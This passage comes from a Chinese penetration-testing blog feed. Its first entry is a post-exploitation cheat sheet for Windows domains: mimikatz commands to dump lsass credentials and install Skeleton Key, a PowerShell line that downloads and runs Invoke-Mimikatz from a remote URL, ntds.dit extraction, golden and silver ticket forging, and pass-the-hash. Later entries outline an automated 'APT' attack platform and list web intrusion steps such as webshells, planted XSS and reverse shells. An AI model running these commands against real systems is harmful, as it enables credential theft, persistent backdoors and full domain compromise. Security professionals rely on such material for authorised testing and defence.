<p>这里dir要使用主机名 而不是ip，不然会提示用户名或密码错误。</p>

<h3 id="保持权限">保持权限</h3>

<p>这块儿东西太多，只能简单提下，有机会单独撰文分析。</p>

<h5 id="linux后门">Linux后门</h5>
<p>webshell，rootkit，改普通用户权限，在某些服务和软件上做手脚，添加ssh-key，添加键盘钩子。</p>

<h5 id="win后门">Win后门</h5>
<p>webshell，劫持dll，劫持在login界面能触发的软件，添加隐藏用户，克隆用户，加远控，powershel脚本，各种票据，开盘符共享，在某些服务和软件上做手脚，添加键盘钩子。</p>

<h5 id="维持域控权限">维持域控权限</h5>

<p>1.直接获取lsass.exe（SSP）中的明文密码：
修改域控注册表位置，在Security Packages下添加mimilib.dll：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages\
</code></pre>
</div>
<p>域控重启后在c:\windows\system32可看到新生成的文件kiwissp.log，里面记录了密码。
mimikatz同时还支持通过内存更新ssp，这样就不需要重启再获取账户信息：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>privilege::debug
misc::memssp
</code></pre>
</div>

<p>2.Hook PasswordChangeNotify无痕，不需要重启和修改注册表，生成dll注入的powershell脚本：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>https://github.com/clymb3r/Misc-Windows-Hacking/blob/master/HookPasswordChange/Debug/HookPasswordReset.dll

https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1
在代码尾部添加如下代码：
Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll –procname lsass
并命名为HookPasswordChangeNotify.ps1

上传HookPasswordChangeNotify.ps1和HookPasswordChange.dll，管理员权限执行：
PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1
</code></pre>
</div>
<p>域控更新密码后（手动），在C:\Windows\Temp下可以找到passwords.txt，其中记录了新修改的密码。</p>

<p>3.Skeleton Key（不需要域控重启）
正常登录域控：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>net use \\WIN-8VVLRPIAJB0.test.local 12345678!Q /user:a@test.local
dir \\WIN-8VVLRPIAJB0.test.local\c$
</code></pre>
</div>
<p>mimikatz在域控上安装Skeleton Key：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>privilege::debug
misc::skeleton
</code></pre>
</div>
<p>使用Skeleton Key登录，mimikatz的默认Skeleton Key设置为mimikatz，权限不变，只是万能密码：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>net use */del /y
net use \\WIN-8VVLRPIAJB0.test.local mimikatz /user:a@test.local
dir \\WIN-8VVLRPIAJB0.test.local\c$
</code></pre>
</div>
<p>4.绕过LSA保护策略，似乎需要自带的mimidrv.sys文件：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>privilege::debug
!+
!processprotect /process:lsass.exe /remove
misc::skeleton
</code></pre>
</div>
<p>本地组策略禁用一些重要组件后，使用mimikatz绕过：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>privilege::debug
misc::cmd
misc::regedit
misc::taskmgr
</code></pre>
</div>

<h3 id="扫描内网">扫描内网</h3>

<h5 id="漏洞扫描">漏洞扫描</h5>

<p>漏洞扫描跟外网不同的是，流量需要控制，但是多数情况下是不会有WAF和防火墙的。</p>

<p>当然，在大一点的内网，如果没有流量监控和分析一般是可能性比较小的。</p>

<p>使用脚本漏洞扫描【如awvs】和路径爆破【如御剑】，操作大体与外网扫描相似。</p>

<p>其实国人也写过不少优秀的自研扫描器，里面有部分是内网专用的：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>https://github.com/We5ter/Scanners-Box
</code></pre>
</div>

<h5 id="信息探测">信息探测</h5>

<p>这类漏扫一般都会提供，可能会探测特定的服务、探测Title等等，但一些专有用途的刺探脚本也许会优于综合型漏扫。</p>

<h5 id="服务探测">服务探测</h5>

<p>服务探测主要使用nmap、masscan一类的端口扫描器，他们存有banner可以和数据库里存储的服务版本进行对比，从而给我们输出相关信息。</p>

<h5 id="口令爆破">口令爆破</h5>

<p>一般像hscan【windows】或者hydra【跨平台】的会比较合适，如果能做sock或者http/https代理的话，如Nmap/MSF里script的效果也是不错的。
至于国内传统厂商出的一些扫描器则显得比较笨拙，做自检还勉强，部署也相当麻烦。</p>

<h3 id="攻击域控">攻击域控</h3>

<h5 id="导出域内用户hash">导出域内用户hash</h5>

<blockquote>
  <p>1.gethashes.exe $local</p>
</blockquote>

<blockquote>
  <p>2.mimikatz</p>
</blockquote>

<div class="highlighter-rouge"><pre class="highlight"><code>privilege::debug
sekurlsa::logonpasswords
获得域控权限、导出所有用户口令、维持域控权限：

附上一套完整打法：
http://blog.csdn.net/pyphrb/article/details/52051321
攻击域控，获得权限

使用ms14-068漏洞
ms14-068.exe -u -p -s -d 【这里参数值省略】

生成伪造缓存test.ccache: 
导入伪造缓存: mimikatz：
kerberos::ptc test.ccache

登陆：
net use \\A-635ECAEE64804.TEST.LOCAL
dir \\A-635ECAEE64804.TEST.LOCAL\c$

导出域
（1）直接获取内存口令 mimikatz：
privilege::debug
sekurlsa::logonpasswords
（2）通过内存文件获取口令 使用procdump导出lsass.dmp mimikatz：

sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full
（3）通过powershell加载mimikatz获取口令

powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
（4）导出所有用户口令 使用Volue Shadow Copy获得SYSTEM、SAM备份（之前文章有介绍） mimikatz：

lsadump::sam SYSTEM.hiv SAM.hiv持域控权限

（1）Skeleton Key mimikatz：

privilege::debug
misc::skeleton
万能钥匙，可使用任意用户登陆域控

net use \\A-635ECAEE64804.TEST.LOCAL mimikatz /user：test

4、维持域控权限
（1）Skeleton Key mimikatz：

privilege::debug
misc::skeleton
万能钥匙，可使用任意用户登陆域控

net use \\A-635ECAEE64804.TEST.LOCAL mimikatz /user：test
这里写图片描述 
（2）golden ticket mimikatz：

lsadump::lsa /patch 
获取krbtgt的ntlmhash

生成万能票据： mimikatz：

kerberos::golden /user:Administrator /domain:test.local /sid:S-1-5-21-2848411111-3820811111-1717111111 /krbtgt:d3b949b1f4ef947820f0950111111111 /ticket:test.kirbi
导入票据： mimikatz：

kerberos::ptt test.kirbi
登陆域控：

net use \\A-635ECAEE64804.TEST.LOCAL
dir \\A-635ECAEE64804.TEST.LOCAL\c$

（3）Pass-The-Hash mimikatz：

sekurlsa::pth /user:Administrator /domain:test.local /ntlm:cc36cf7a8514893efccd332446158b1a

</code></pre>
</div>

<blockquote>
  <p>3.pwdump【直接运行Pwdump7即可】</p>
</blockquote>

<blockquote>
  <p>4.vssown.vbs + libesedb + NtdsXtract【太耗时】
http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html</p>
</blockquote>

<blockquote>
  <p>5.ShadowCopy+QuarksPwDump【参考内容见下】：
http://blog.csdn.net/citelao/article/details/50948103</p>
</blockquote>

<div class="highlighter-rouge"><pre class="highlight"><code>（1）使用ShadowCopy的命令行版，编写bat实现拷贝ntds.dit至当前目录

setlocal
if NOT "%CALLBACK_SCRIPT%"=="" goto :IS_CALLBACK
set SOURCE_DRIVE_LETTER=%SystemDrive%
set SOURCE_RELATIVE_PATH=\windows\ntds\ntds.dit
set DESTINATION_PATH=%~dp0
@echo ...Determine the scripts to be executed/generated...
set CALLBACK_SCRIPT=%~dpnx0
set TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.cmd
@echo ...Creating the shadow copy...
"%~dp0vsshadow.exe" -script=%TEMP_GENERATED_SCRIPT% -exec="%CALLBACK_SCRIPT%" %SOURCE_DRIVE_LETTER%
del /f %TEMP_GENERATED_SCRIPT%
@goto :EOF
:IS_CALLBACK
setlocal
@echo ...Obtaining the shadow copy device name...
call %TEMP_GENERATED_SCRIPT%
@echo ...Copying from the shadow copy to the destination path...
copy "%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%" %DESTINATION_PATH%
参考链接： http://blogs.msdn.com/b/adioltean/archive/2005/01/05/346793.aspx

（2）使用QuarksPwDump直接读取信息并将结果导出至文件，先执行

esentutl /p /o ntds.dit
修复复制出来的数据库

QuarksPwDump.exe -dhb -hist -nt ntds.dit -o log.txt
读取并导出。

注：实际使用时ntds.dit和log.txt需要加绝对路径

Tips：

QuarksPwDump.exe：Dump various types of Windows credentials without injecting in any process.
源码下载链接，vs2010直接编译即可
https://github.com/quarkslab/quarkspwdump
</code></pre>
</div>

<blockquote>
  <p>6.ntdsutil.exe + QuarksPwDump.exe【生成ntds.dit，再读取hash】</p>
</blockquote>

<div class="highlighter-rouge"><pre class="highlight"><code>#ntdsutil
#snapshot
#activate instance ntds
#create
#mount {GUID}
#copy c:\MOUNT_POINT\WINDOWS\NTDS\NTDS.dit c:\NTDS_saved.dit
#unmount {GUID}
#delete {GUID}
#quit
#quit

#QuarksPwDump.exe --dump-hash-domain --ntds-file c:\ntds.dit
</code></pre>
</div>

<blockquote>
  <p>7.powershell【比如上文提到的Invoke-mimikatz脚本】</p>
</blockquote>

<h5 id="hash传递">hash传递</h5>

<p>受限管理员模式顾名思义,只对管理员组有效.所以如果你获取到的用户属于远程桌面用户组,那么是无法通过hash登录的.会提示错误。</p>

<p>mimikatz:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>sekurlsa::pth /user:Administrator /domain:test.local /ntlm:cc36cf7a8514893efccd332446158b1a
</code></pre>
</div>

<p>MSF:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>use exploit/windows/smb/psexec

</code></pre>
</div>

<p>Keimpx：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>Keimpx -t ip -c ~/hash.txt -v 2
</code></pre>
</div>

<p>PTH套件：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Pth-winexe可以借助哈希执行程序得到一个cmdshell
Pth-winexe - U ... //ip cmd

参考：
http://blog.csdn.net/the__apollo/article/details/70474935

</code></pre>
</div>

<p>WCE：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>wce -s ...
</code></pre>
</div>

<p>psexec/wmiexec：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>前面有提到用法，这里就不单独讲了。
</code></pre>
</div>

<p>附上横向域渗透【案例比较经典】</p>

<div class="highlighter-rouge"><pre class="highlight"><code>http://www.mottoin.com/89413.html
</code></pre>
</div>

<h3 id="提取票据">提取票据</h3>

<h5 id="传递票据">传递票据</h5>

<p>因为域用户对应sid本就可以通过程序自动获取，清除导入票据也能自动实现，当然，如果想用其他域用户信息攻击，也可以加上sid手动导入票据，kekeo的快捷用法仅需要以下参数：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>https://github.com/gentilkiwi/kekeo/releases

ms14068.exe /domain:test.local /user:test /password:test /ptt
</code></pre>
</div>

<p>在我们成功获得域控权限后，就可以导出域控内存中的Ticket，在默认的10个小时以内都可以利用来登录域控</p>

<p>通过mimikatz导出内存中的Ticket，执行：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>sekurlsa::tickets /export
</code></pre>
</div>
<p>保存成文件，一共导出如下文件，找个像这样的：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>xxx@krbtgt-TEST.LOCAL.kirbi
</code></pre>
</div>

<p>在域普通用户的主机进行导入：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz "kerberos::ptt C:\test\xxx@krbtgt-TEST.LOCAL.kirbi"
</code></pre>
</div>

<p>查看是否有域控权限，</p>
<div class="highlighter-rouge"><pre class="highlight"><code>klist
dir \\xxxx\c$
</code></pre>
</div>
<h5 id="金票据">金票据</h5>

<p>每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，不就可以随意伪造Ticket了吗？</p>

<p>实际上只要拿到了域控权限，在上面就可以很容易的获得krbtgt的Hash值，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket。</p>

<p>域控执行下面的命令，生成mimikatz.log记录输出，使用log输出是为了方便复制Hash值：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz log "lsadump::dcsync /domain:test.local /user:krbtgt"
</code></pre>
</div>
<p>找到如下的信息：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>/domain：test.local
/sid:S-1-5-21-4155807533-921486164-2767329826 
/aes256:af71a24ea463446f9b4c645e1bfe1e0f1c70c7d785df10acf008106a055e682f
</code></pre>
</div>
<p>生成Golden Ticket,伪造的用户设置为god,执行下面的命令，生成文件gold.kirbi:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz "kerberos::golden /domain:test.local /sid:S-1-5-21-4155807533-921486164-2767329826 
/aes256:af71a24ea463446f9b4c645e1bfe1e0f1c70c7d785df10acf008106a055e682f /user:god 
/ticket:gold.kirbi"
</code></pre>
</div>

<p>注意，生成Golden Ticket不仅可以使用aes256，也可用krbtgt的NTLM hash，可以用mimikatz “lsadump::lsa /patch”导出。</p>

<p>导入Golden Ticket：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz# kerberos::ptt c:\test\gold.kirbi
</code></pre>
</div>
<p>检验是否成功获得域控权限：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>c:&gt;klist
c:&gt;dir \\xxxx\c$
</code></pre>
</div>
<p>注意：
这种方式导入的Ticket默认在20分钟以内生效，当然，如果过期了，再次ptt导入Golden Ticket就好。可以伪造任意用户，即使其不存在。可以伪造任意用户，即使其不存在。</p>

<p>另一种做法，大同小异，注意这里填写的是域管理：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz # kerberos::purge
mimikatz # kerberos::golden /admin:Administrator /domain:pentstlab.com /sid:S-1-5-21-3883552807-251258116-2724407435 /krbtgt:6a8e501fabcf264c70ef3316c6aab7dc /ticket:Administrator.kiribi
mimikatz # kerberos::ptt Administrator.kiribi
mimikatz # kerberos::tgt

#验证下：
E:\&gt;net use \\WIN-0DKN2AS0T2G\c$
E:\&gt;psexec.exe \\WIN-0DKN2AS0T2G cmd
</code></pre>
</div>

<h5 id="银票据">银票据</h5>
<p>Silver Ticket是伪造的TGS(Ticket Granting Server)ticket，所以也叫service ticket。
将它同Golden Ticket做对比：</p>
<blockquote>
  <p>1、访问权限不同
Golden Ticket是伪造的TGT(Ticket Granting Ticket)，所以可以获取任何Kerberos服务权限。
Silver Ticket是伪造的TGS，也就是说其范围有限，只能访问指定的服务权限。</p>
</blockquote>

<blockquote>
  <p>2、加密方式不同
Golden Ticket是由krbtgt的hash加密
Silver Ticket是由服务账户（通常为计算机账户）hash加密</p>
</blockquote>

<blockquote>
  <p>3、认证流程不同
Golden Ticket在使用的过程需要同域控通信
Silver Ticket在使用的过程不需要同域控通信
也就是说只要手里有Silver Ticket，就可以跳过KDC认证，直接去访问指定的服务。</p>
</blockquote>

<p>在域控上执行如下命令来获取域控主机的本地管理员账户hash：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz log "sekurlsa::logonpasswords"
</code></pre>
</div>

<p>整理信息，使用mimikatz执行如下命令导入Silver Ticket，此时可以成功访问域控上的文件共享：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz "kerberos::golden /domain:test.local /sid:S-1-5-21-4155807533-921486164-2767329826 /target:WIN-8VVLRPIAJB0.test.local /service:cifs /rc4:d5304f9ea69523479560ca4ebb5a2155 /user:silver /ptt"
</code></pre>
</div>
<p>注意：
Silver Ticket是伪造的TGS，也就是说其范围有限，只能访问指定的服务权限。
代替方案，如下可以远程访问LDAP服务来获得krbtgt的信息：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz "lsadump::dcsync /dc:WIN-8VVLRPIAJB0.test.local /domain:test.local /user:krbtgt"
</code></pre>
</div>

<p>注意：</p>
<blockquote>
  <p>lsadump::dcsync
向 DC 发起一个同步对象（可获取帐户的密码信息）的质询。
需要的权限包括管理员组（Administrators），域管理员组（ Domain Admins）或企业管理员组（Enterprise Admins）以及域控制器的计算机帐户
只读域控制器默认不允许读取用户密码数据。</p>
</blockquote>

<h3 id="中间人攻击">中间人攻击</h3>

<p>中间人攻击有很多方法，有借助arp进行双向欺骗嗅探，有借助内网DNS劫持的，有借助断网重连直接劫持的。</p>

<p>经典的工具有netfuke，cain，ettercap等等。</p>

<p>具体的在此不多说，以后有机会继续补充。</p>

<h3 id="跨网段攻击">跨网段攻击</h3>

<h5 id="借助多网卡主机">借助多网卡主机</h5>

<p>如果在多网卡主机的情况下，我们可以通过msf建立路由，然后转发，最终通过sock建立代理。</p>

<h5 id="借助交换机路由">借助交换机/路由</h5>

<p>一般大一点的路由，或者三、四层交换机可能会提供VPN功能，通过命令行或者WEB界面能操作进行启用或转发。
当然部分命令行被封装在沙盒里，功能是比较有限的。</p>

<h5 id="借助代理">借助代理</h5>

<p>内网和外网入口本身可能存在认证vpn【默认密码、弱口令】，甚至匿名代理。而通过他们我们也可以跨网段进行渗透。</p>

<h3 id="后记">后记</h3>

<p>本文大部分资料参考自网络，因为内容太多无法一一附上出处，有介意的原作者请私信我加上。
最后，感谢某云、FB、数字等等，感谢互联网上所有热爱分享的童鞋们。</p>
]]></content>
      <categories>
        
          <category> pentest </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[规模渗透架构部署设想]]></title>
      <url>/pentest/2017/12/16/architecture-of-apt-pentest/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#00B050;"><strong>在我们的测试中，可能在对大型目标进行探测时，人手不足就会显得特别无力。这时候，使用机器代替人工进行一些重复性工作，就显得尤为重要。咱们在这儿来谈谈，如何开发和部署APT渗透系统的架构。</strong></span>
</p>

<h3 id="web扫描系统">web扫描系统</h3>

<p>在web扫描框架上，我们可以这样设计：</p>

<ul>
  <li>信息探测模块：通过指定URL，自动获取该网站的基本信息。</li>
  <li>资产发现模块：收集子域名，并对主机IP资产进行梳理。</li>
  <li>基础扫描模块：对网站进行路径探测，对系统进行端口探测。</li>
  <li>弱口令核查模块：对主机系统和常用CMS网站进行默认/弱口令检测。</li>
  <li>漏洞扫描模块：以体系内域名URL为入口点，可以只单独探测该URL的web漏洞；也可以根据该入口点，进行自动化资产发现和检测，再统一对获得的资产进行扫描。</li>
  <li>社工搜集模块：从多个搜索引擎和接口中，提取有需要的信息，供给其他模块使用。</li>
  <li>第三方扫描模块：可集成第三方扫描器，通过接口进行模块化整合。</li>
</ul>

<h3 id="口令核查系统">口令核查系统</h3>

<p>在web扫描系统里，本来是集成了弱口令核查模块。但其中仅仅对常用的CMS和系统服务进行了核查，而且力度比较有限。</p>

<p>此处对口令核查系统的设计，旨在对特定的系统服务或者后台进行爆破，功能大概如下：</p>

<ul>
  <li>定制化社工字典，拥有生成选项。</li>
  <li>可以破解简单验证码。</li>
  <li>可附加验证码绕过、明文提取选项。</li>
  <li>集成扫描框架的爆破脚本。</li>
  <li>集成Hydra和Medusa以及某些工具，供给调用。</li>
</ul>

<h3 id="漏洞分储系统">漏洞分储系统</h3>

<p>在这个系统上，鄙人将它设计为漏洞库，提供api给第三方调用。</p>

<p>其中，需要注意以下几点：</p>
<ul>
  <li>部分提供poc调用，无poc的提供详情。</li>
  <li>前端提供搜索和查看功能。</li>
  <li>提供API调用。</li>
</ul>

<h3 id="漏洞验证系统">漏洞验证系统</h3>

<p>这个功能本来想和漏洞分储系统相结合的，但后来为了耦合性，还是分离了出来。</p>
<ul>
  <li>支持单条和批量验证。</li>
  <li>搜索选取漏洞exp。</li>
  <li>采用中间件来传递消息。</li>
  <li>延时结果记录。</li>
  <li>不做数据记录。</li>
</ul>

<h3 id="域名采集系统">域名采集系统</h3>

<p>最初的版本只做了域名采集的爬虫，但后来考虑到实用性，后期会集成市面上已有的一些域名采集技术。
另外，这里会支持分布式/命令行运行，提供api给第三方调用。管控中心可以一键发送执行。功能如下：</p>
<ul>
  <li>域名爬虫。</li>
  <li>其他域名采集技术。</li>
</ul>

<p>至于细节，可以参加之前撰写的博文<a href="/spider/2017/10/19/domain-spider/">《域名采集爬虫》</a>。</p>

<h3 id="渗透方案查询">渗透方案查询</h3>

<p>这是在某产品经理启发下的产物，在渗透中常常在进行到某一步时，会遇到卡壳的时候。</p>

<p>这时候我们就需要一个可查阅的清单或者wiki，甚至能给出完整的建设性方案。后来大概考虑了下，大概可以这样构建：</p>

<ul>
  <li>知名系统获取shell建议（扫描有限制）</li>
  <li>提权流程列表</li>
  <li>横向和后渗透命令清单</li>
  <li>复杂系统获取权限详情</li>
  <li>powershell脚本功能查询</li>
  <li>武器库列表</li>
</ul>

<h3 id="渗透报告管理">渗透报告管理</h3>

<p>当然，在渗透后可能会有报告输出。也有可能需要上传和填写报告，本系统可能会要求几个点：</p>

<ul>
  <li>拥有固定格式，可以导出pdf、word等格式。</li>
  <li>自动整理可能获取权限的机器和敏感IP段。</li>
  <li>上传报告时，需要填写固定几个要点，比如IP和主机名以及网段，然后再填写细节。</li>
</ul>

<h3 id="核管控中心">核管控中心</h3>

<p>一套完整的APT渗透框架，总是需要核心管控的，这样方便管理，也能方便全局统筹的需求。
大体功能，可能有以下几点：</p>

<ul>
  <li>系统机器上线和下线控制。</li>
  <li>可以API命令调用各系统。</li>
  <li>以IP或者域名为入口，对所有现存系统数据库进行检索。</li>
  <li>配置全局参数，不定期更新，对各系统推送。</li>
</ul>

<h3 id="总结">总结</h3>

<p>直至撰稿之日，鄙人已经完成了一部分工作。但由于研究方向有变，再加上一些其他不可抗拒的原因，可能开发工作会停滞一段时间。</p>

<p>在以后恢复开发工作时，应该会有更多的思路更新，与诸君共勉！</p>
]]></content>
      <categories>
        
          <category> pentest </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[黑盒漏洞挖掘（WEB篇）]]></title>
      <url>/pentest/2017/11/13/pentest-for-blackbox/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#DAA520;"><strong>在安全测试中，我们常常会遇到一些重复性工作。而鄙人记性不佳，有时候并不能高效的进行工作。因此，自己萌生了撰写工作总结的想法，将以往的工作列清单，做一个总结，以作查阅之用。</strong></span>
</p>

<p>当然，这个系列也希望会持续更新。人，总是要有进步不是。</p>

<h3 id="克敌机先">克敌机先</h3>

<p>在测试某个网站时，我们常常需要先探测该网站的基本信息：</p>

<ul>
  <li>是否存在WAF，像创宇盾这种检测到攻击会马上暂时性封IP，阿里云盾偷偷摸摸检测到攻击行为后，会直接无前兆地封禁你IP，至于安全狗、D盾、云锁、百度云安全这种就不一一例举了，暂时不细说。</li>
  <li>路径扫描，如果存在WAF或者目标较为脆弱，可以直接调整为非常低的线程数，比如一个线程，然后对目标进行文件/目录低速探测。如果没有太多限制，那就使劲儿造作。</li>
  <li>如果需要测试的网站比较大且比较耐操，且没有WAF/IDS，建议配置好去重和线程，使用大型扫描器对网站进行探测。这样做的好处是不会漏掉一些常用的漏洞，而且可以获取网站的结构。但缺点是需要等待比较长的时间，也容易被管理发现。</li>
  <li>部分网站的后台，可能存在于域名的其他端口上。如果服务器不存在CDN，这时候可以借助类nmap的扫描器来探测端口开放情况，比如使用命令：
```
nmap -sS -sV -p- –script=”http-title,banner” 192.168.2.10</li>
</ul>

<p>```</p>
<ul>
  <li>插件检测server类型，是否为tomcat/jboss/glassfish之类，探测是否存在可访问webserver console。</li>
  <li>检测网站是否为公开的CMS，探测CMS类型，漏洞库是否存在相关漏洞。</li>
  <li>查看有无列目录的权限。</li>
  <li>查看是否提供附件下载，如果是参数传递的URL，这类链接通常比较敏感。如果可以明显给出了文件的相对/绝对路径/可预测的类文件名id，我们可以优先进行任意文件下载测试，其次再进行常规漏洞测试。如果仅仅是给出了普通的id值，那可以直接进行常规漏洞测试。</li>
  <li>查看网站是否有明显的配置漏洞，比如提供了allow *的crossdomain.xml；没有进行过滤的robots.txt；容易猜测名字的源码压缩包；泄露敏感信息的配置文件、JS文件甚至普通html文件；.git/.svn文件供下载等。</li>
</ul>

<h3 id="权限权限">权限，权限！</h3>

<p>在遇到某个网站时，窃以为应该先寻找能够获取更大权限的地方，而登录后的权限无疑会更大。</p>

<p>这时，我们可以尝试进行注册，或者夺取原有的账户权限。</p>

<p>此时有一点需要注意，在登录的入口处和搜索处，可能存在一定的脆弱性，建议同其他前台产生的敏感数据包一同进行fuzz检测。</p>

<h5 id="自给自足">自给自足</h5>

<p>在本身无权限时，我们可以去寻找注册的地方，间接获取更高的权限。
同时在此过程中，我们有几个点需要注意：</p>

<ul>
  <li>研究找回密码功能，查看是否有无逻辑漏洞可以跳过，可否预测和爆破验证码。</li>
  <li>可能存在上传，查看能否直接获取webshell</li>
  <li>可能存在XSS，如果在注册能直接通过时，需要等待注册完毕，去用户中心再继续测试。如若需要等待审核，可以尝试植入XSS平台代码，等待机器上线。</li>
  <li>如若存在手机和邮箱验证，可尝试有无邮箱炸弹漏洞。</li>
</ul>

<h5 id="鸠占鹊巢">鸠占鹊巢</h5>

<p>有时候管理或者开发不够细心，我们可以通过各种手段去获取原有普通用户或者管理用户的权限。在我们能够比较容易的获取后台登陆口，或者在无法注册用户时，我们可以如此操作：</p>

<ul>
  <li>通过手工猜测密码/识别简单验证码/验证码绕过/直接爆破，猜测密码，来获取原有用户的权限。</li>
  <li>查看用户名是否存在，尝试能否预测/枚举用户，可能有机会猜测管理账号。</li>
  <li>搜寻文档，后台页面可能存在一些敏感说明文档提供下载，里面有可能会记录测试账号等敏感内容，对测试会比较有帮助。</li>
  <li>万能密码绕过，这种情况一般asp和php类型的网站会存在的稍微多些，不过新一点的网站这样的问题越来越少了。</li>
  <li>禁用JS，直接卡入后台管理页面。这种情况一般需要预先爆破或者在JS源码里找寻后台路径，然后再使用该方法。</li>
  <li>工具/插件修改cookie，直接进入管理后台。这种方法比较古老了，现在成功的几率是比较小的。</li>
  <li>善用类Google/类Github/类shodan引擎，搜寻泄露的后台账号密码/带认证的链接等等。</li>
  <li>设法找寻网站管理和开发者的相关信息，查找社工库组合相关密码。如果是针对企业和组织进行渗透，可设法查询社工库里相关的邮箱密码，再借助可登入的邮箱翻看敏感内容，从而达到进入后台的目的。</li>
</ul>

<h3 id="用户中心">用户中心</h3>

<p>登入网站用户中心后，我们一般可以做如下测试。</p>

<ul>
  <li>抓包测试，查看在数据包中修改参数，能否越权枚举和修改用户的基本信息/订单/地址等内容。</li>
  <li>在用户互发私信功能处，可能存在存储型XSS。</li>
  <li>如若在注册时，并未测试存储XSS、邮箱/手机/私信炸弹、越权修改密码，可在此测试。</li>
  <li>查看是否存在附件上传/头像上传，文件命名规律也可稍作检查，最后查看能否直接获取webshell。</li>
  <li>查看搜索功能是否有别于前台，能否间接枚举用户或者手机号。</li>
  <li>在用户中心进行SQL注入和XSS的fuzz测试，成功几率大抵会高于前台。</li>
  <li>对于邀请注册/登出系统/登录跳转/注册验证的链接，都可能存在任意URL跳转的漏洞。</li>
  <li>如果用户中心未启用token验证，在修改密码/修改用户名和昵称/修改地址/修改邮箱和手机号等地方，很可能存在CSRF漏洞。</li>
  <li>上传后的地址可能存在列目录漏洞。</li>
</ul>

<h3 id="管理后台">管理后台</h3>

<ul>
  <li>管理后台可能存在上传的地方，可以尝试能否获取webshell。</li>
  <li>上传处，如若能上传文本类型文档，查看是否有预览功能，进而考虑能否写入存储型XSS。</li>
  <li>上传处，如果能够上传XML文档，或者只是提交XML内容，可以尝试XXE攻击。</li>
  <li>上传处，如果过滤了大多数动态文件，但并不是使用的白名单，可以考虑上传shtml，同样可能执行命令。</li>
  <li>配置处可能存在未过滤的地方，可以直接写入存储型XSS。</li>
  <li>php类的网站，有的可以通过转义和截断，往配置文件里写入webshell。</li>
  <li>asp类的网站，可以通过写配置，然后数据库备份得到webshell，这里不细说。</li>
  <li>后台大多验证不严，可以尝试SQL注入和XSS的fuzz测试。</li>
  <li>后台可能存在执行命令的地方，可进行fuzz，获取敏感配置或者直接反弹shell。</li>
  <li>如若后台存在通讯录，在不违反合规条款的情况下，可尝试自行处理。</li>
  <li>部分后台如果存在管理用户表，在不违反合规条款的情况下，可尝试自行处理。</li>
  <li>管理后台大概率不会验证token的，所以很多网站后台也因此存在CSRF。</li>
  <li>如果非管理用户，也可以尝试越权修改其他用户的密码。</li>
  <li>后台有时会存在读取文件内容，或者探测内网存活的功能，抑或是上传特殊文件进行解析，可以尝试是否存在SSRF。</li>
</ul>

<h3 id="权宜之计">权宜之计</h3>

<p>如果我们无法登陆后台，也无法注册怎么办？我们可以尝试以下几种做法：</p>

<ul>
  <li>评论处可能存在上传和存储型XSS，也可能存在没有验证重复提交的CSRF。</li>
  <li>提交个人建议等供审核的内容时，有可能后台没有做XSS过滤，这时候就可以进行盲打。</li>
  <li>某些用户的个人页面可以通过枚举id获得，里面可能存在一些敏感信息。</li>
  <li>在前台或者用户中心，可能存在星号隐藏一些敏感信息，比如说手机号。这些信息在某些时候，可能在源码里直接或者间接能看到。</li>
  <li>前台可能存在一些伪静态页面，建议随手尝试注入，虽然现在这样的案例已经比较少了。</li>
  <li>在尝试列目录漏洞时，可以在目录后面加上XSS字符尝试是否有反馈，也可以尝试不存在的文件名（hacksb.php）或者错误的文件名（~list.aspx、error.jspx）进行报错。</li>
</ul>

<h3 id="端口入侵">端口入侵</h3>

<ul>
  <li>某些端口存在服务认证，如果有弱口令/默认口令，可以爆破进入。</li>
  <li>某些WebServer在特定端口，同样存在单独的WEB登陆口，如果突破进入后台，可以部署包拿webshell，也可能执行命令反弹shell。</li>
  <li>代理端口，这类服务比较少，如果找到可以尝试连接，设法将其作为跳板，切入内网。</li>
  <li>特定端口开启的服务，可能存在RCE，结合MSF可以反弹shell。</li>
</ul>

<h3 id="细节思考">细节思考</h3>

